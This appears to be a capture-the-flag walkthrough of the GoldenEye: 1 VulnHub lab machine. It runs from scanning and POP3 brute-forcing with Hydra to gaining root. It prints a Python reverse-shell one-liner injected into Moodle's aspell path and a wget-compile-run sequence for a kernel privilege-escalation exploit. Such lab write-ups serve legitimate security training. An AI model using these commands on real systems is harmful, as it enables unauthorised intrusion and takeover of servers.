I will try to explain the solution steps of **GoldenEye: 1** vulnerable machine. I liked the fact that this machine has a story and I tried to show the solution steps. I tried to put as many pictures as I could. I hope that will be useful :)

You can [**_download_**](https://www.vulnhub.com/entry/goldeneye-1,240/) the GoldenEye vulnerable machine here.

# My Pentest Methodology

1. Network Scan
2. Nikto, Dirb and Nmap scans
3. Decoding Process
4. Brute force attack on POP3 service with Hydra
5. Read People’s Messages and find usernames
6. Domain Name hijacking
7. Finding the password and username of the admin user
8. Vulnerability scan on Moodle
9. Metasploit usage
10. Authorization Upgrade
11. Capturing Root Flag

# Configurations

Firstly I put Kali Linux and GoldenEye: 1 maki behind the NAT network in VirtualBox. The reason I do this is because I don’t want to have an IP block where I can write IP addresses faster and the vulnerable machine is disconnected from the outside.

> _My IP Address range:_ **_5.5.5.0/24_**

![](https://miro.medium.com/v2/resize:fit:875/0*T-6xRPCc_tFuVUpN.png)

My IP address: 5.5.5.8

# 1) Using “netdiscover” Tool

![](https://miro.medium.com/v2/resize:fit:1250/0*jv-FhOnuJ57sLs75.png)

GoldenEye IP address: 5.5.5.13

According to the information I have obtained here, I think that the address 5.5.5.13 may belong to GoldenEye: 1 machine. I’m trying this IP address on Google for checking purposes.

![](https://miro.medium.com/v2/resize:fit:1250/0*t3UkmdGjInI1aY5V.png)

As you can see, I can connect to this IP address. This proves us that the **IP address of the GoldenEye: 1 machine is 5.5.5.13**.

# 2) Nmap, Dirb and Nikto Scans

We do these scans in the solution of every vulnerable machine. While we get information about open ports with Nmap, we can get information about existing directories with nikto and dirb.

![](https://miro.medium.com/v2/resize:fit:1250/0*TD2Q4wyA_jZLxWne.png)

Results of Nikto

![](https://miro.medium.com/v2/resize:fit:875/0*EjWgqQxe_Cwc2q0R.png)

Resultd of Dirb

As seen above, nothing came out of the Dirb and Nikto scans. So this time our job is not with directories. Already when we entered the website, a strange article appeared. Before that, let’s have a look at the Nmap result.

![](https://miro.medium.com/v2/resize:fit:1250/0*3wEbCZSWCiXIzSGw.png)

Results of Nmap

As you can see, the Nmap result tells us where we need to look. It says we need to look for something on ports 55006 and 55007. I’m going to try port 55007 because there is no ssl connection, a strange situation came up for me. We will check here. But first, let’s look on the web page and I wonder if we can get something. Because we still don’t have a username or password value.

# 3) Analyzing Page Source

![](https://miro.medium.com/v2/resize:fit:1250/0*VZCcmxThk-SldLWv.png)

When we look at the web page, it says that first we need to go to the **“/ sev-home /”** directory on the screen. Of course, you need to have a bit of English to understand them.

Because this vulnerable machine tried to write a little story style. We will see articles like this constantly.

I want to view the page source before going to the “/sev /home/” directory. For this, simply right click anywhere on the screen. Let’s see what will come out when you click on the part that says **“View Page Source”.**

![](https://miro.medium.com/v2/resize:fit:1494/0*1j55vNe3ed2VqwGs.png)

terminal.js file

Here are two things that caught my attention in the page source: **index.css** and **terminal.js files**. Generally, you never guess where information is stored on such machines. Try to enter and look in as many places as you can. I tried to go into both files and found something interesting in **terminal.js.**

![](https://miro.medium.com/v2/resize:fit:1546/0*9F2S6ULp5khyAXT5.png)

**Contents of terminal.js file**

As I have just stated, you need to have some English knowledge to understand these places. The following is said here, “You can see the Borris person’s password information in encrypted form in the red box.” So we can now see Boris and his password value. But of course it remains encrypted.

We can use **Burp Suite** tool to crack this password. I will open the Burp Suite tool and try to crack this password.

![](https://miro.medium.com/v2/resize:fit:1598/0*_42Ug9tTYaUR8TIT.png)

Burp Suite and password cracking

As you can see here I cracked the password. Now I have a username and password information.

> _Username: Boris or boris  
> Password: InvincibleHack3r_

Let’s try to use these values. There is a directory we just have to go to. It was writing huge on the web page. Let’s go to the **“/sev-home/”** directory.

![](https://miro.medium.com/v2/resize:fit:1250/0*hnjdTbzVJ-OzCBTm.png)

I’m not sure if the username is **“Boris”** or **“boris”** so I tried with both. I logged in with the username “boris” and **“InvincibleHack3r**” password that we decoded with BurpSuit.

![](https://miro.medium.com/v2/resize:fit:1611/0*l3YfJvN8_SQXMfx4.png)

POP3

After successfully logging in with the username and password, the screen I came across was like this. Notice that it talks about pop3 services. In the Nmap scan, this port 55007 also caught our attention. Let’s continue on the road with the tips we have obtained.

# 4) Hydra and Password Attack

Şuana kadar elimde bir kullanıcı ismi var: “boris”. Bu kullanıcı adının POP3 hizmetinde kullanıcı adı ve şifresi var mı öğrenmemiz gerekiyor. Hemen bunun için “Hydra” dan yardım alalım.

![](https://miro.medium.com/v2/resize:fit:1790/0*cB8rjTFnxGfbCtGE.png)

As you can see hydra returned a result to me. The information we obtained became the password of someone with the username “boris” in POP3 services.

> _Kullanıcı adı : boris_
> 
> _Password : secret1!_

So let’s connect to your POP3 services.

![](https://miro.medium.com/v2/resize:fit:1786/0*SNTn611jH4CqPNb4.jpeg)

As you can see I got into the POP3 service. There are 3 files here, file number 1,2 and 3. Let’s read them one by one.

![](https://miro.medium.com/v2/resize:fit:1773/0*VNYH4pJHymAtA8De.jpeg)

RETR 1 command

Nothing like you can see here.

![](https://miro.medium.com/v2/resize:fit:875/0*CByqXZ0o0b5lvbuW.jpeg)

There is an important point in file 2. We see that there is a user named “natalya” who sent this mail. This is a remarkable detail. Let’s not forget this and continue.

![](https://miro.medium.com/v2/resize:fit:1764/0*CUt0z6FqZlKWFj1w.jpeg)

In the 3rd file, the important detail was sent by a user named “alec”. Let’s consider them. In other words, there are other usernames in the system besides the “boris” username. Let’s use “Hydra” for these usernames.

![](https://miro.medium.com/v2/resize:fit:1685/0*IQ1u47X-8-73oX9I.png)

Result of Hydra

Here, we obtained the password value of the user “natalya”. Let’s connect to the POP3 service now.

![](https://miro.medium.com/v2/resize:fit:875/0*eU5d1DiU7JPSjaIq.jpeg)

We see two different file contents that appear again. Let’s read them right now.

![](https://miro.medium.com/v2/resize:fit:1683/0*lQxAtV3R3pz2OZLd.jpeg)

Nothing important is found in file 1.

![](https://miro.medium.com/v2/resize:fit:1666/0*6xLy6cgnBdPzO2f3.png)

And yes, we have captured important information in file 2. We found a username and password value and a domain address. Then let’s get to work immediately.

# 5) Save Domain Address

We need to save the domain address we have somewhere. The place where we will save this is the “/ etc / hosts /” file.

![](https://miro.medium.com/v2/resize:fit:875/0*lWf3SJhN2hXKflUp.png)

With the nano editor I entered and saved the information as above. Now let’s go to this domain address via web browser.

![](https://miro.medium.com/v2/resize:fit:1250/0*oG6tdGEkVhJpaXUD.jpeg)

I came across such a page. I tried to login with the username and password values in the mails of the “natalya” user. I entered the login screen from the “Login” extension on the upper left.

![](https://miro.medium.com/v2/resize:fit:1604/0*uEEuKV27nugaSChp.jpeg)

I have successfully logged in here. I made research in the places next to the screen I entered immediately. When I entered the **“Messages”** section, something caught my attention.

![](https://miro.medium.com/v2/resize:fit:1603/0*bBIBRCR0ZmKcFuW_.jpeg)

Here, a message came from “Dr. Doak” to the user “xeina”. So, we can infer that there is someone with the username “doak” in the system.

![](https://miro.medium.com/v2/resize:fit:1680/0*attMt_6KtcIoGFaH.png)

I ran “Hydra” for user “doak” gene and got the username and password value.  
Let’s go to the POP3 service and check their mail.

![](https://miro.medium.com/v2/resize:fit:875/0*ymj_ev4hxDUTBOPq.jpeg)

There is one file. Let’s read this file immediately.

![](https://miro.medium.com/v2/resize:fit:1668/0*uHmIojh0LWMLdLrm.png)

And yes, we got a username and password value again. Let’s use this information on the screen where we log in with the user “xeina”.

![](https://miro.medium.com/v2/resize:fit:1604/0*9z40XodAynAHLRjb.jpeg)

I used this information here and logged in. Again, I browsed all directories to gather information.

![](https://miro.medium.com/v2/resize:fit:1606/0*uFQVnkfIeNDvTMQM.jpeg)

I found something strange in the “My private files” directory. I found a file called “s3cret.txt”. Let’s download this file and look inside.

![](https://miro.medium.com/v2/resize:fit:811/0*wh3rHPjJcJHrWWO5.jpeg)

As you have read again, it says something is under the directory **“/dir007key/for-007.jpg”**. Let’s go here and see what’s going on.

![](https://miro.medium.com/v2/resize:fit:875/0*8jxGOkAp2IPrlTjp.jpeg)

In order to go to the image, you need to type the extension in the “s3cret.txt” file as above. Then you can go to the page with the “enter” key.

![](https://miro.medium.com/v2/resize:fit:1610/0*zLRxVAcAm4BKQWEM.jpeg)

Such a picture greeted us. It doesn’t say anything in the picture. But usually in such places, information is hidden in the picture. Let’s get this secret information out.

![](https://miro.medium.com/v2/resize:fit:875/0*mmDrSpaXi9zYd6va.jpeg)

I immediately went to the place where the picture was downloaded from the terminal. Here I read the picture with the **“strings”** command. Notice that while starting to write some logical things from the beginning, there is a word starting with **“eFdb…”** in the third line. Let’s investigate this word right away.

![](https://miro.medium.com/v2/resize:fit:875/0*Xy0R2seeM6p6jqEC.jpeg)

After putting it in the Base64 translation, we have obtained a text with a password.

> _xWinter1995x!_

Now what could this thing be about. Notice that we came here completely thanks to the “s3cret.txt” file. You have noticed the “adm1n cr3ds” text in this file. My guess is that this could be admin’s password.

Let’s go to the login page and try it.

> _Username : admin_
> 
> _password: xWinter1995x!_

We have successfully logged in. The next way to follow is to inject a code that can open a remote connection to us anywhere in the admin panel.

Here is where I found the place to inject code.

![](https://miro.medium.com/v2/resize:fit:1618/0*_R97O_bdm-8PGbp3.png)

I came to the “System paths” directory under the server directory and wrote the following python code where it says **“Path to aspell”.**

``` python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP ADRESINIZ>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
If I trigger this code, it will give me a reverse shell. To do this, I have to adjust the settings to make this code work.

![](https://miro.medium.com/v2/resize:fit:1616/0*lMq_GBBQV1KUU1gG.png)

If you set the “spell engine” part to PSpellShell in the TinyMCE editor, you can trigger the python code you just used. To do this, after making these settings, write any post and perform a spell check.

Before doing this, I had set the port number “1234” in python code. Let’s start listening to this port with “netcat” tool. If we trigger the code, we will see that we get a “reverse shell”.

I open a new terminal page and run the netcat tool.

![](https://miro.medium.com/v2/resize:fit:875/0*1gQQnIUBascjvewq.jpeg)

Now let’s share a new post with the admin account on the web.

![](https://miro.medium.com/v2/resize:fit:1601/0*yW1Luc-98czzZyhO.png)

We come to the place where we will enter the new entry with the black arrow. If we click on the place at the end of the red arrow after filling in the places that he wants us to fill, the spell check process will be started, so our python code will be triggered. Let’s take a look at the netcat tool

# 6) Root Olma

![](https://miro.medium.com/v2/resize:fit:1743/0*A33QQuxVvG0RW7PI.jpeg)

As you can see, the connection was established immediately. I immediately ran the interactive shell import command with python code. The next thing to do is to learn the operating system and scan for vulnerabilities.  
I found the operating system as UBUNTU 3.13. Let’s go on a vulnerability search.

![](https://miro.medium.com/v2/resize:fit:1799/0*QeZ4tzyko4snc9Wh.jpeg)

As you can see I immediately found the results with the “searchsploit” tool. The 37292.c file will probably benefit us.

I downloaded this file immediately. To download the file, I went to “exploitdb” and typed it as 37292.c.

![](https://miro.medium.com/v2/resize:fit:1606/0*MVbv-xtUAs6BZpJG.jpeg)

As you can see I downloaded this “.c” file from here. I say it to make our job easier. There is no “gcc” editor to run this “.c” file on the machine we leaked. So we need to make a small change in this “37292.c” file.

![](https://miro.medium.com/v2/resize:fit:2290/0*2VzE_0wP4ay019mC.png)

Normally it read “gcc” at the tip of the red arrow. We set it to “cc”. Please remember to save and exit after setting.

Now let’s transfer this malicious “37292.c” file to the opposite side. This file is currently on our own computer. Let’s set up a server on our own computer to transfer this. I have detailed these stages in my previous articles. Let’s transfer this file.

![](https://miro.medium.com/v2/resize:fit:875/0*1_1Yqc5SawXv6PiF.jpeg)

As you can see, I raised a server on my side thanks to python. I have specified the port of this server as “9876”.

 ``` bash
python -m SimpleHTTPServer <port number>
```

Then put the malicious file “37292.c” under “/ root /” directory. In order to send this file to the opposite computer, that is, to the computer we are trying to infiltrate, to the terminal line on the opposite computer, as you can see in the picture above:

```
wget http://<host ip address>:<host port number>/37292.c
```


The file is currently on the opposite computer. Let’s run this file immediately.

```
 cc 37292.c -o <hack>
```

```
 ./<hack>
```

If we run the above commands in order, we will be root now.

![](https://miro.medium.com/v2/resize:fit:875/0*DjfudfW3KqQUUY19.jpeg)

As you can see my output file was named “hack”. After running it I saw that I am root. Let’s find the flag file.

![](https://miro.medium.com/v2/resize:fit:875/0*5NRsdbJaYkzFGrb9.jpeg)

The flag file is usually under the “/ root /” directory. I went under the root directory and ran the “ls” command. I could not get a printout. But then when I viewed “ls -a” i.e. hidden files, I saw the flag file and succeeded in reading.